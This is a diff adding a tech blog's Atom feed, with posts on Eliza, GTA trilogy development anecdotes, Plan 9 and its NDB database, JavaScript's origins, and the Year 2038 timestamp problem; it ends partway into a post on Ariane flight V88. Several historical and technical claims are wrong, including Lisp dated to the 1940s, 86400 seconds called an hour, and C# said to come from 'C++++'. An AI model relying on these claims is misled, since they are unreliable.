@@ -1,0 +1,1120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<?xml-stylesheet href="/feeds/atom-style.xsl" type="text/xsl"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://blog.simplecode.gr</id>
+    <title>Simplecode Blog</title>
+    <updated>2025-06-10T09:50:23.555Z</updated>
+    <generator>Astro-Theme-Retypeset with Feed for Node.js</generator>
+    <author>
+        <name>Simplecode</name>
+        <uri>https://blog.simplecode.gr</uri>
+    </author>
+    <link rel="alternate" href="https://blog.simplecode.gr"/>
+    <link rel="self" href="https://blog.simplecode.gr/atom.xml"/>
+    <rights>Copyright © 2025 Simplecode</rights>
+    <entry>
+        <title type="html"><![CDATA[“Because I care about you” - Eliza, The First Chat Bot]]></title>
+        <id>https://blog.simplecode.gr/posts/because-i-care-about-you-eliza-the-first-chat-bot/</id>
+        <link href="https://blog.simplecode.gr/posts/because-i-care-about-you-eliza-the-first-chat-bot/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[“Because I care about you” - Eliza, The First Chat Bot]]></summary>
+        <content type="html"><![CDATA[<p>[...]
+Input : "And why do you ask that?"
+Response : "Because I care about you."</p>
+<p>These lines mark one of the earliest recorded human-machine interactions in history.</p>
+<p>The program responsible for this exchange was Eliza, developed in 1967 at MIT by Joseph Weizenbaum, as the pioneering chat bot aimed at simulating conversations with a human. Written in MAD-SLIP, Eliza operated with a core component that would then call upon various LISP-like scripts – LISP being one of the precursor languages to modern-day JavaScript. Each script simulated a different persona, with the most renowned being “DOCTOR,” which mimicked interactions with a therapist adhering to the Rogerian psychotherapy approach.</p>
+<p>Eliza operated by utilizing an extensive set of pre-programmed responses. Upon receiving input, it would sift through these responses to find the most relevant and appropriate one, often modifying it slightly, according to the input, before outputting it.</p>
+<p>This early program can be viewed as a rudimentary form of natural language processing, akin to contemporary systems like ChatGPT, but with a much much more simpler data set, since ChatGPT have scrapped the whole today’s internet. A more fitting analogy might be Microsoft Word’s Clippy, which similarly provided predetermined responses based on user input.</p>
+<p>You can chat with Eliza here : https://web.njit.edu/~ronkowit/eliza.html</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Making of the Grand Theft Auto Trilogy]]></title>
+        <id>https://blog.simplecode.gr/posts/making-of-the-grand-theft-auto-trilogy/</id>
+        <link href="https://blog.simplecode.gr/posts/making-of-the-grand-theft-auto-trilogy/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Making of the Grand Theft Auto Trilogy]]></summary>
+        <content type="html"><![CDATA[<p>I was lucky enough to read all the posts of Obbe Vermeij at the blog "Insider Rockstar North", before he had to take it down.</p>
+<p>Obbe Vermeij was a developer working at Rockstar North game studio, during the GTA Trilogy era (III, Vice City, San Andreas...).</p>
+<p>For computer games, the GTA Trilogy is a reference point, as it was one of the first game series offering such an open-world experience, that you could travel around and do whatever, without limitations.</p>
+<p>Obbe seems to have been one of the key people who contributed to this freedom with his mindset, even while there were considerations of minimizing this freedom to make the game less heavy.</p>
+<blockquote>
+<p>Gta1 had 3 cities and we wanted to do the same.</p>
+<p>There was one particular meeting that I still have nightmares about. In R*N we would usually make the big game decisions with 5 people. We had a meeting where 3 people wanted the cities to be on different maps. This would save memory as the models for the skylines of the cities wouldn't need to be in memory at the same time. Gta1 had 3 cities on different maps. The player would take planes/buses/trains to travel between maps.</p>
+<p>I wanted the cities to be on the same map as it is important to be able to drive between cities. Even if this meant we'd have to find some memory elsewhere. The 5th guy wasn't there that day. I wasn't able to convince the others. It was super frustrating as it seemed we were about to make a massive mistake.</p>
+<p>The following day we had another meeting. The 5th guy agreed with me and was much more persuasive than me. He talked them round and the cities ended up on the same map. Disaster averted.
+Obbe Vermeij</p>
+<p>The 3 cities with the country side in between, almost killed the map artists. gtaIII and Vice had maps of 4x4km and even then there was loads of water. The SA map was 6x6 and densily packed.</p>
+<p>~ Obbe Vermeij</p>
+</blockquote>
+<p>It was precisely this freedom that everyone, including myself, relished in the game.</p>
+<p>Developers and game artists found inspiration in this as well.</p>
+<blockquote>
+<p>We took the code from Vice City as the foundation for SA. Many things were improved but no structural improvements were needed.</p>
+<p>R*NY organized another 'research' trip. They hired a bunch of town cars and we drove between Vegas, LA and San Fransisco. The artists took pictures. It was loads of fun.</p>
+<p>~ Obbe Vermeij</p>
+</blockquote>
+<blockquote>
+<p>The artists gave me a texture for the moon in III. I placed the moon in the sky, made sure it was visible at night and that it was a reasonable size.</p>
+<p>A few days later 4 artists were at my desk asking me to change the size of the moon.</p>
+<p>"No problem" I said.</p>
+<p>It turned out they couldn't decide what the size of the moon should be. 2 of them wanted it smaller to be more realistic. The other 2 wanted it larger to be more cinematic.</p>
+<p>This went on a bit and I suggested to make the size of the moon changeable in the game. This way they could decide in their own time and let me know the conclusion. Since I was working on the sniper rifle, I made it so that the moon toggled through 3 sizes (small, medium, large) as the player sniped it.</p>
+<p>The artists never got back to me so I just left it in. It was still there in SA.</p>
+<p>~ Obbe Vermeij</p>
+</blockquote>
+<p>Everything you see in a videogame, must be loaded. From the hard drive, to the RAM / graphics card's VRAM and then to your screen. And if the game is huge, it can't be all loaded at once. There needs to be a mechanism that knows when to load something and when to unload it, according to your location in the map. As you move around, specially to such an open-world and huge game, this mechanism must do this job and it must done it well.</p>
+<p>GTA Trilogy was ahead of it's time, and to make this streaming mechanism work well, they did lot of tricks.</p>
+<blockquote>
+<p>For example, from GTA III until GTA San Andreas, the game could manage up to seven different car models around the player simultaneously due to the lack of RAM memory in that era. This meant that during intense situations, like when the police were chasing you and the game had to load police cars and helicopters, the number of pedestrian cars loaded decreased, often to just one or two.</p>
+<p>For instance; if the player has a 6 star wanted level, the game would load the fbi car and the helicopter.</p>
+<p>There may still be police cars and swat vans around from when the player had a lower wanted level.</p>
+<p>If there are any injured pedestrians, the game had to load the ambulance.</p>
+<p>Before you know it, the game only has 1 or 2 models left for regular civilian cars.</p>
+<p>Even without the wanted level, the game was often forced to load certain car models.</p>
+<p>~ Obbe Vermeij</p>
+</blockquote>
+<p>As a cherry on top, all those things had to be loaded using a slow CD-ROM, as this was the storage medium in many consoles at the time. And CDs are not only slow, but they have another problem as well : if the thing you want to load, exists on a point before the current point the CD is on the CD reader, you need to wait for the CD to re-spin. Now, imagine doing this for many things. To address this, they grouped related data together.</p>
+<blockquote>
+<p>They meticulously arranged data on the CD, ensuring that elements closely linked in the 3D game world were also physically close on the CD for simultaneous reading, and
+in problematic areas, they fine-tuned details, such as creating inclines or increasing air resistance, to slow down vehicle movement subtly (without the player realizing the reasons behind it).</p>
+<p>~ Obbe Vermeij</p>
+</blockquote>
+<blockquote>
+<p>The hardest technical challenge to solve during the development of gta3 was the streaming. Streaming involves loading and un-loading models as the player moves over the map. The streaming was coded by Adam Fowler.</p>
+<p>When we started out with gta3 the hope was that the entire map would fit in memory. The map would simply be loaded at the start of the game.</p>
+<p>Memory was limited on the PS2 and the artists were forced to reduce the texture sizes and to re-use textures everywhere. This resulted in the city looking bland. They eventually asked Adam whether he could develop a streaming system.</p>
+<p>The idea of streaming is to load the map only around the player. As the player moves, the models for nearby models are loaded from the CD into memory and buildings that are now far away are removed.</p>
+<p>Streaming is also used for vehicle models, pedestrian models, sound effects, music and scripts but the map posed the greatest difficulty as this involved more data than everything else combined.</p>
+<p>Unfortunately the CD was quite slow in loading the models. The loading speed depends on the location of the models on the CD (the track). Models that are close together are loaded quickly but models that are far away are slow. (This is because the CD needs to accelerate/decelerate as the head moves to a different track). This is causing a lot of the sounds coming from the CD drive when playing gta.</p>
+<p>Adam spent a lot of time ingenuously moving the models around on the CD. The idea was to place models close together in the CD if they were also close together in the world.</p>
+<p>Even after all these optimizations, streaming was still not fast enough. You can literally think of it as a race between the player travelling and the streaming loading the models. At times the player would be too fast and the world just wasn't there yet. These problems seemed to get worse with older CDs.</p>
+<p>If we couldn't speed the streaming up any further, we had no option but to slow the player down.</p>
+<p>In Portland (first island in gta3) there used to be a big strip running all along the island. This was a worst case scenario. The player could go fast and there were loads of buildings to load. The streaming couldn't cope here. Eventually the artists had to change the layout and basically put a building on top of the strip. The player had to go around which would slow him down allowing the streaming to catch up.</p>
+<p>Over time we identified other areas where the streaming was not coping and we would set up zones here. Within these zones we increased the drag (air resistance) on the vehicles a little. Maybe 5 or 10%. It was hardly noticeable but it helped.</p>
+<p>~ Obbe Vermeij</p>
+</blockquote>
+<p>Cheats were heavily optimized as well. To make it hard to find the cheats, instead of storing them as strings (which would result to be easy to find by searching in the binary), they used a number for each of them. If the sum of the pressed keys, matched the number of the cheat, the cheat was activated.</p>
+<blockquote>
+<p>The cheats in the trilogy were activated by simply typing a sequence of characters.</p>
+<p>On PC the sequence would be something like</p>
+<p>ILOVESCOTLAND to make it rain or</p>
+<p>GUNSGUNSGUNS to give the player loads of weapons.</p>
+<p>The game remembers the last 20 or so keypresses and every time a new key is pressed, these keypresses are compared with the cheats. If there is a match, the cheat will activate.</p>
+<p>The straightforward way of doing this would be to compare the string "ILOVESCOTLAND" with the string of keypresses. This approach would mean that the strings for the cheats would be in memory as readable text. Any hacker could easily find the cheats and they would all be discovered on the day of release.</p>
+<p>This is why I used 'hash codes' to store the cheats. A hash code is a number that is calculated from a string. As an example; a simple hash algorithm could add up the ASCII values of each character of the string.</p>
+<p>The hash code for ILOVESCOTLAND would be 983.</p>
+<p>For GUNSGUNSGUNS it would be 951.</p>
+<p>This is just an example. The actual Hash algorithm used is more complicated.</p>
+<p>The game would also calculate the Hash code for the last 20 or so keypresses and compare the numbers.</p>
+<p>The good news is that it is harder to hack the cheat because the code only stores the number (ie 983) and not the full string (ILOVESCOTLAND). This part worked because the cheats were not hacked. (They were eventually discovered by people trying random input until a cheat happened)</p>
+<p>The bad news is that different strings can result in the same hash code.</p>
+<p>This is why initially when cheats were discovered people found random strings (ie HDLMAAXOPK) and not the string I had set up (ie ILOVESCOTLAND)</p>
+<p>This also meant the cheats triggered more often than I had planned. This caused cheats to sometimes happen unintentionally. This has actually happened during peoples' speed runs. These speed runs had to be aborted as the rules are clear. No cheats.</p>
+<p>~ Obbe Vermeij</p>
+</blockquote>
+<p>The weather, on the other hand, wasnt optimized at all. It was just a fixed look-up table, that according to time, there was a weather value.</p>
+<blockquote>
+<p>Every in-game hour, the next weather type is picked from a table. The table is 40 (or maybe 34, can't quite remember) entries long. If it is raining now, it will be raining again in 40 in-game hours.</p>
+<p>The visual effects for the weather type will transition over the hour.</p>
+<p>For instance:</p>
+<p>At 2:00 it would be 100% sunny.</p>
+<p>At 2:15 it would be 75% sunny and 25% overcast</p>
+<p>At 2:30 it would be 50/50</p>
+<p>etc</p>
+<p>The table frequently has the same weather type for several hours so the weather isn't always in-flux.</p>
+<p>There are script commands to override the weather type. This allows the level designers to force the weather type for a particular mission or cut-scene.</p>
+<p>~ Obbe Vermeij</p>
+</blockquote>
+<p>It's nice reading how all those things were made !</p>
+<p>I hope Obbe will come up with many more details.</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Origins of Key-Value Document Databases - NDB, the Hidden Gem from Plan 9]]></title>
+        <id>https://blog.simplecode.gr/posts/origins-of-key-value-document-databases-ndb-the-hidden-gem-from-plan-9/</id>
+        <link href="https://blog.simplecode.gr/posts/origins-of-key-value-document-databases-ndb-the-hidden-gem-from-plan-9/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Origins of Key-Value Document Databases - NDB, the Hidden Gem from Plan 9]]></summary>
+        <content type="html"><![CDATA[<p>Plan 9 was a utopian operating system that failed. It’s vision was to make distributed computing an everyday thing by treating everything as a file. And when we say everything, we mean everything, so even the hardware of each computer – allowing you to share that hardware with other machines easily. Even though this sounds technically impossible, it is very possible, and Plan 9 actually made it real! The main reason behind its failure was that this came at the cost of flexibility. In order to do that trick that it promised, Plan 9 asked the whole world to change, while it was already too late, since computer science had already started to get standardized at the time of release.</p>
+<p>There is a dedicated post about Plan 9, “Plan 9: The Utopian OS and Lessons in Inflexible Architecture“, which you most probably have already read.</p>
+<p>Today, we are going to unveil a very hidden gem within that operating system, which was an internal database called “NDB”, which stands for “Network Database”. “NDB” was one of the first databases that stored data as documents, treating them as key-value pairs, and not only that, indexing them! All of those features are going to be explained below.</p>
+<p>Storing data as documents means that, in contrast to tabular databases, your data don’t have to have a structure.
+In contrast, the more commonly used tabular databases are like Excel files; you have to somehow have a structure on what you write: you have columns with their titles and rows with the related data.
+In documents, you are more free as you write whatever you want for each specific document, more like text files.</p>
+<p>This is how a tabular database (or an Excel) would look like:</p>
+<table>
+<thead>
+<tr>
+<th>Id</th>
+<th>Name</th>
+<th>Gender</th>
+<th>Cat</th>
+<th>Turtle</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>Irina</td>
+<td>Female</td>
+<td>Luluka</td>
+<td></td>
+</tr>
+<tr>
+<td>1</td>
+<td>Rantouan</td>
+<td>Male</td>
+<td></td>
+<td>Galopoula</td>
+</tr>
+</tbody>
+</table>
+<p>And this is how storing indocuments(or text files) would look like:</p>
+<p>One document for Irina:</p>
+<p>Name="Irina"
+Gender="Female"
+Cat="Luluka"</p>
+<p>And another one document for Rantouan:</p>
+<p>Name="Rantouan"
+Gender="Male"
+Turtle="Galopoula"</p>
+<p>Note how easy it is to add extra information, related and unique to each person, like the cats and turtles above with a document database and how rigid it is with a tabular one. Tabular databases have the advantage that if your data are all going to have the same structure, then you get a huge performance advantage. Document databases are more performant when your data are unstructured.</p>
+<p>Key-value pairs mean that you store your data in a structure where it’s a pair of key (names) and values, like in the document examples above: <code>Pet=Luluka</code>. We mention this because when you store data as documents, there are many other ways to store them as well, for example, XML <code>&lt;Pet&gt;Luluka&lt;/Pet&gt;</code> or JSON <code>{“Pet” : “Luluka”}</code>.</p>
+<p>Finally, indexing means that not only data are stored, but notes on how to access them easily for the system are being kept. Indexing is very important in order for a database to be fast.
+Imagine it like in the phone-book, where there is a small bookmark where names with “A” start, names with “B” start, etc. Another example is to imagine a very huge book that you just want to find something in, and usually on the first pages, there is an “index” page, where the first page of each chapter is being referenced, so you don’t have to search the whole book page by page.</p>
+<p>Today, a software engineer would probably use Redis or MongoDB as a key-value document database. It’s very interesting to know that for all of the above things, NDB was one of the first -most probably even the first- databases to be capable of.</p>
+<p>This gem of a database was hidden inside Plan 9, and it was mostly used for managing networks – but not only. Most of the modern operating systems still use a plain file without database supporting mechanism – it sounds logical to take more care of the network, if someone would think of Plan 9’s distributed nature.</p>
+<p>Below, feel free to read the manual of NDB from “Plan9 : The Programmer’s Manual Volume 1, 4th Edition (2002) (Computer Science Research Center, Bell Laboratories, Lucent Technologies)” :</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Origins of Javascript and Why We Prefer “Let” Instead of “Var”]]></title>
+        <id>https://blog.simplecode.gr/posts/origins-of-javascript-and-why-we-prefer-let-instead-of-var/</id>
+        <link href="https://blog.simplecode.gr/posts/origins-of-javascript-and-why-we-prefer-let-instead-of-var/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Origins of Javascript and Why We Prefer “Let” Instead of “Var”]]></summary>
+        <content type="html"><![CDATA[<p>If you wish to make an apple pie from scratch, you must first invent the universe.</p>
+<p>In the 1930s, Alonzo Church introduced Lambda calculus. It is a formal system for expressing mathematical logic and computations using functions. Long before computations were performed by machines, they were done by humans, and Lambda calculus helped formalize these processes in written form.</p>
+<p>Lambda calculus looks like this:</p>
+<p>λx.x<em>2 // function that takes input xx and returns x</em>2λx.λy.x^2+y^2 // function that takes input x,y and returns the sum of them in power of 2</p>
+<p>In the 1940s, Steve Russell, Timothy P. Hart and Mike Levin specified Lisp, a programming language based on the concepts of Lamda calculus. In 1970s, MIT created Scheme, a lisp dialect.</p>
+<p>Scheme looks like this :</p>
+<p>(display "Hello, World!")
+(newline)</p>
+<p>In 1987, Self was created by David Ungar, Randall Smith, Stanford University, Sun Microsystems, as a dialect of Smalltalk. Smalltalk created on 1969 at Xerox PARC by Learning Research Group (LRG) scientists, including Alan Kay, Dan Ingalls, Adele Goldberg, Ted Kaehler, Diana Merry, and Scott Wallace.</p>
+<p>Self looks like this :</p>
+<p>"Hello, World!" println.</p>
+<p>In the early 1990s, Sun Microsystems began developing Java. This language was created by them because none of the existing languages were capable of solving their problems. After a lot of experimentation with the dominant language at the time, C++, they created and tested an extension of C++ called C++++, which much they didn’t finish and later became C# by Microsoft. Based on their experiments, they created Java.</p>
+<p>Java looks like this :</p>
+<p>public class HelloWorld {
+public static void main(String[] args) {
+System.out.println("Hello, World!");
+}
+}</p>
+<p>Note that Java has a C language-style syntax. C is a very good, probably the best, and very old language still used today for hard tasks like writing operating systems. It’s very fast but hard to write.</p>
+<p>In 1995, Netscape hired Brendan Eich to implement the Scheme language in the browser. Instead of doing that, he created a new language, combiningJava‘s syntax (essentially C), most of theScheme (for nearly everything), andSelf‘s prototype (for easy data structure and no classes in contrast to Java). Essentially, he incorporated anything from famous languages at the time that made developers’ lives easier and blended them all together.</p>
+<p>The result was the language that we all love, Javascript.</p>
+<p>It’s worth noting that Self’s prototype had no classes and still had objects, whereas objects in most languages are a byproduct of classes and not an abstract structure solely for holding data. Even though JavaScript later implemented classes, they are not widely used even today, and objects remain an abstract structure for holding data. In other languages, abstract structures that hold data are called differently; for example, in C#, they are called “Struct”.</p>
+<p>Since Brendan Eich created that language we all use in only… 10 days, some things were not finished. One of those things was scope. As Brendan Eich himself said, if he had worked a few more days on the language, he would have fixed scoping better. He didn’t, and that resulted in issues with the scope of variables, such as how a global variable is accessed from functions below or how a variable can be shared across different functions, becoming problematic. It took many years to fix that, as companies were all trying to create their own and only own JavaScript dialect for their browser. For example, Netscape had its own, created by Eich, and then Microsoft had JScript. They were all sabotaging the standardization of the language.</p>
+<p>During the 2000s, JavaScript became increasingly useful in everyday life, and many other companies joined the club. Eventually, they all agreed to standardize JavaScript. The ECMA standard was created, and they fixed the scoping problem by introducing “let” and “const” instead of “var” as new better working ways to define new variables, without removing “var” for backward compatibility reasons. This resulted in much better scoping and a much better Javascript.</p>
+<p>In 2009, Ryan Dahl took Javascript out of the browser and created an executable that allowed you to run JavaScript code on a terminal. This was named Node.js, and nowadays it’s used everywhere to create applications that are built in JavaScript but don’t run in the browser. However, many of those apps, whether they’re desktop apps made with the “Electron” framework or mobile apps made with Cordova, Ionic, React Native, or any other framework, may run on Node but still launch a browser (without visible controls or an address bar) to display a UI with modern graphics. This is because browsers tend to be the most preferable way to run something nowadays.</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Plan 9 - The Utopian OS and Lessons in Inflexible Architecture]]></title>
+        <id>https://blog.simplecode.gr/posts/plan-9-the-utopian-os-and-lessons-in-inflexible-architecture/</id>
+        <link href="https://blog.simplecode.gr/posts/plan-9-the-utopian-os-and-lessons-in-inflexible-architecture/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Plan 9 - The Utopian OS]]></summary>
+        <content type="html"><![CDATA[<p>The biggest art in software design is to know when to be flexible and when not to. I believe it's such a wonderful art, that none accomplish to master it.</p>
+<p>A great example of lack of flexibility is Plan9. Plan9, was the successor of Unix, made from the same team, at the same place, Bell Labs.</p>
+<p>In Unix, "everything is a file", which means that even parts of hardware from your computer are binded to a file existing under <code>/dev</code> (from "devices") and you can alter their state, read, delete from those devices, just by playing with their co-related file. I will give an example from Linux, which is a more modern successor of Unix and has more cool things, as right now, writing this, I'm able to manipulate my "Caps Lock" LED from my keyboard, without really changing to caps lock, simply by setting the value of the co-related file to 1 (for on) or 0 (for off) :</p>
+<pre><code>  echo 1 | sudo tee /sys/class/leds/input2::capslock/brightness; # Caps Lock's LED fake on
+  sleep 2;
+  echo 0 | sudo tee /sys/class/leds/input2::capslock/brightness; # Caps Lock's LED fake off
+</code></pre>
+<p>(remember to set it back to as it was !)</p>
+<p>Now, Plan9, seeing the networked future that we live in coming, they wanted to take this concept to the next level. They wanted to take the "everything is a file" concept to the next level and each computer to be able to share those files through network.
+By doing this, you could be literally be able to :</p>
+<ul>
+<li>share your computing resources, your computing power, through network</li>
+<li>share your hard disk over network</li>
+<li>share your screen over network
+Without using any additional software that mimics this functionality. It would had been native.
+For exaple, you want to share your screen with your friend ? You wouldn't need to use a program for this, you could just share your GPU with him. Or even, think of those services nowdays that you rent a GPU online and they give you access to a remote desktop to play there games... again, you wouldn't even had to connect to a remote desktop, you could just attach the remote GPU to your computer, again, natively.</li>
+</ul>
+<p>The question is, why such an innovative idea didn't became the norm ? Specially today, the posibilities could had been amazing. It could had been literally an software abstraction of Von Neumann architecture that would make you forget about Von Neumann architecture. With such innovation, we would had... flying cars at 2025 for sure, or maybe we wouldn't, but I wouldn't be thinking if my PC will be able to play GTA6 without renting... a remote, different than mine PC on the cloud... I would be able to play and have my local setup at the same time.</p>
+<p>The reason is simple: It wasn't simple. It wasn't flexible. Going from Unix to Plan9 was like going from bike to spaceship. Every program had to be rewriten and follow a different style, far away than what we're used to. There wasn't even a compatibility layer to address this.</p>
+<p>Even if Plan9 didn't made it, I'm sure that this next step will take place in the future of operating systems, but it will not be a revolution, as Plan9 wanted to be, but a reform.</p>
+<p>From Plan9, Go came out, well not as Go but as Alef and later Limbo (from successor of Plan9, Inferno) and from them Go came out. Go was made from people working on Plan9. Those languages tried to handle memory in a distributed context that you are not sure where things are not needed anymore and also they focused a lot on concurrency, again a distrubuted context thing - specially back then, without multi-core CPUs.</p>
+<p>Also, Linux is abstracting more and more the hardware, as in the given example with my keyboard LEDs at the beggining, which makes me feel positive to believe that the time that I will be able to mount a remote graphics card as it's part of my PC, instead of logging in to a remote desktop session, is not that far away.</p>
+<p>Our computers are getting more and more connected, so Plan9 didn't made it -because of not being simple and flexible- but it's concept did !</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Time is infinite, but a computer’s memory isn’t]]></title>
+        <id>https://blog.simplecode.gr/posts/time-is-infinite-but-a-computers-memory-isnt/</id>
+        <link href="https://blog.simplecode.gr/posts/time-is-infinite-but-a-computers-memory-isnt/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Time is infinite, but a computer’s memory isn’t]]></summary>
+        <content type="html"><![CDATA[<p>In low-level coding, we usually have to specify the length of a variable. We have many types, including int32 and int64, which represent numbers in binary, using 32 bits or 64 bits, respectively.</p>
+<p>The int32, of number 4 for example, looks like this:</p>
+<pre><code> 00000000 00000000 00000000 00000100
+</code></pre>
+<p>That’s it – 32 zeros or ones to represent a number.</p>
+<p>There is a whole arithmetic system behind this concept, called binary arithmetic. It uses 0s and 1s to represent normal numbers. The concept is simple and by observing how binary changes with each increment, you can see how it works :</p>
+<table>
+<thead>
+<tr>
+<th>Decimal</th>
+<th>Binary</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>00000000 00000000 00000000 00000000</td>
+</tr>
+<tr>
+<td>1</td>
+<td>00000000 00000000 00000000 00000001</td>
+</tr>
+<tr>
+<td>2</td>
+<td>00000000 00000000 00000000 00000010</td>
+</tr>
+<tr>
+<td>3</td>
+<td>00000000 00000000 00000000 00000011</td>
+</tr>
+<tr>
+<td>4</td>
+<td>00000000 00000000 00000000 00000100</td>
+</tr>
+<tr>
+<td>5</td>
+<td>00000000 00000000 00000000 00000101</td>
+</tr>
+<tr>
+<td>6</td>
+<td>00000000 00000000 00000000 00000110</td>
+</tr>
+</tbody>
+</table>
+<p>We use this system because computers can only store 0s and 1s, representing the states of electricity: charged (1) and not charged (0). A computer’s memory consists of millions of small metallic squares that are either electrically charged (1) or not (0).</p>
+<p>In low-level programming, specifying the amount of memory needed means defining the maximum length of 0s and 1s for each number.
+An int32 has 32 bits and can store values from -2147483648 to 2147483647 (if it’s a signed int, where the first bit indicates negativity). An int64 has 64 bits and can store values from -9223372036854775808 to 9223372036854775807 (again, if it’s signed).</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Min (Decimal)</th>
+<th>Max (Decimal)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Signed int32</td>
+<td>-2147483648</td>
+<td>2147483647</td>
+</tr>
+<tr>
+<td>Signed int64</td>
+<td>-9223372036854775808</td>
+<td>9223372036854775807</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Min (Binary)</th>
+<th>Max (Binary)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Signed int32</td>
+<td>10000000 00000000 00000000 00000000</td>
+<td>01111111 11111111 11111111 11111111</td>
+</tr>
+<tr>
+<td>Signed int64</td>
+<td>10000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</td>
+<td>01111111 11111111 11111111 11111111 11111111 11111111 11111111 11111111</td>
+</tr>
+</tbody>
+</table>
+<p>Time in computing is often saved as a timestamp, which counts the seconds from a specific moment – usually that moment is “UNIX epoch”: 1970 Jan 1 12:00:00</p>
+<table>
+<thead>
+<tr>
+<th>Unix Timestamp</th>
+<th>Comment</th>
+<th>Date</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td></td>
+<td>1970 Jan 1 1970 12:00:00</td>
+</tr>
+<tr>
+<td>1</td>
+<td></td>
+<td>1970 Jan 1 1970 12:00:01</td>
+</tr>
+<tr>
+<td>2</td>
+<td></td>
+<td>1970 Jan 1 1970 12:00:02</td>
+</tr>
+<tr>
+<td>86400</td>
+<td>an hour after “epoch”</td>
+<td>1970 Jan 2 1970 12:00:00</td>
+</tr>
+<tr>
+<td>1720080673</td>
+<td>seconds from “epoch” until now</td>
+<td>2024 Jul 4 2024 08:11:13</td>
+</tr>
+</tbody>
+</table>
+<p>This raises the question: What happens when we reach 2147483647, the maximum value for type signed int32, on systems that store timestamp using that type ? This will occur on 2038 Jan 19 03:14:07, which is not far from now – just 14 years from 2024. And to understand if this is important or not : do many systems store timestamps in int32? Yes, most used to, as it was the standard originating from UNIX.</p>
+<p>Many systems have already implemented a solution to this issue.</p>
+<ul>
+<li>Linux, as a successor to Unix, used to store timestamps in 32-bit integers for 32-bit systems. With version 5.6 (2020), it switched to 64-bit. Still, individual applications, protocols, and file formats must be updated as well. [1]</li>
+<li>Windows, in the 32-bit version of gmtime in the C runtime libraries, stores timestamps in 32-bit integers. Many individual applications have already addressed this issue, like Oracle’s Access Manager from version 10.1.4.3. [2]</li>
+</ul>
+<p>However, some systems have not addressed this issue.</p>
+<ul>
+<li>Many databases still store timestamps as int32 by default.</li>
+<li>SAP’s S/4HANA, used for business management and the successor of the world’s most used ERP (SAP’s ERP), supports only “finish” dates up to 2048 Jan 19. ( The situation is similar to the previously mentioned systems, except the timestamp starts from 1980 Jan 1, instead of the UNIX epoch which is 1970 Jan 1 12:00:00 )</li>
+</ul>
+<p>A “panacea“ to this issue is to store timestamps as 64-bit integers in any new system design, avoiding future migrations and fixes. Storing in 64-bit, as Arnd Bergmann suggested for Linux [1], allows for a maximum timestamp of 9223372036854775807, or : 292277026596 April 12 15:30:07. This is 292 billion years from now [3], far beyond our immediate concerns.</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Min (Date)</th>
+<th>Max (Date)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Signed int32</td>
+<td>1901 Dec 13 20:45:52</td>
+<td>2038 Jan 19 03:14:07</td>
+</tr>
+<tr>
+<td>Signed int64</td>
+<td>Before universe !</td>
+<td>292277026596 Apr 12 15:30:07</td>
+</tr>
+</tbody>
+</table>
+<p>However, this solution is not simple, as storing values with double the length is not always optimal. For a large database, this would result in significant and impractical memory usage.</p>
+<p>This journey through a man-made abstraction of time – from infinity to plain 0s and 1s within a fixed size – leads us to a question : Does storing all timestamps as int64 justify the cost, or are there better scenarios for the future?</p>
+]]></content>
+        <author>
+            <name>Simplecode</name>
+            <uri>https://blog.simplecode.gr</uri>
+        </author>
+        <published>2025-06-09T00:00:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[The Tragic Software Failure of Ariane Flight V88]]></title>
+        <id>https://blog.simplecode.gr/posts/the-tragic-software-failure-of-ariane-flight-v88-en/</id>
+        <link href="https://blog.simplecode.gr/posts/the-tragic-software-failure-of-ariane-flight-v88-en/"/>
+        <updated>2025-06-09T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[The Tragic Software Failure of Ariane Flight V88]]></summary>
+        <content type="html"><![CDATA[<p>On the 4th of June 2024, we mark 28 years since the tragic failure of Ariane flight V88.</p>
+<p>Ariane 5 rocket was designed to carry massive payloads -up to 21,000 kg- into the cosmos, following in the footsteps of its predecessor, the Ariane 4.</p>
+<p>The Ariane 4 had its own success story, with a smaller payload capacity of 10,500 kg, thanks in part to its reliable software. This software, made up of intricate lines of code, was meant to guide the rocket flawlessly through space. When it came time for the Ariane 5 to take flight, engineers saw no reason to reinvent the wheel, so they incorporated much of the same code.</p>
